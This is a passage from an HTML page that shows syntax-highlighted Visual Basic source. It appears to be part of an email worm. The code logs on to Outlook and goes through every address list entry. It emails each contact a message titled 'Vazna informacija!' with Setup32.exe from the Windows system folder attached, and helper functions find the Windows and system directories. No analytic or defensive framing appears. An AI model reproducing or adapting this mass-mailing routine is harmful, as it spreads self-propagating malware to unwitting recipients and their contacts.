    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">b.Logon</span><span class="sc0"> </span><span class="sc4">"profile"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"password"</span><span class="sc0">
    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">b.addresslists.Count</span><span class="sc0">
    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">b.addresslists</span><span class="sc6">(</span><span class="sc7">f</span><span class="sc6">).</span><span class="sc7">addressentries.Count</span><span class="sc0">
        </span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">a.createitem</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">b.addresslists</span><span class="sc6">(</span><span class="sc7">f</span><span class="sc6">).</span><span class="sc7">addressentries</span><span class="sc6">(</span><span class="sc7">d</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">Recipients.Add</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Vazna informacija!"</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">poruka2</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">Attachments.Add</span><span class="sc0"> </span><span class="sc7">Syspath</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"\Setup32.exe"</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">send</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
        </span><span class="sc7">g</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0">
    </span><span class="sc7">b.logoff</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Winpath</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc7">mDatoteka</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
    </span><span class="sc7">Duzina</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowsDirectory</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">strsave</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Duzina</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">Winpath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">strsave</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Syspath</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc7">mDatoteka</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
    </span><span class="sc7">Duzina</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSystemDirectory</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">strsave</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Duzina</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">Syspath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">strsave</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span></div></body>
</html>
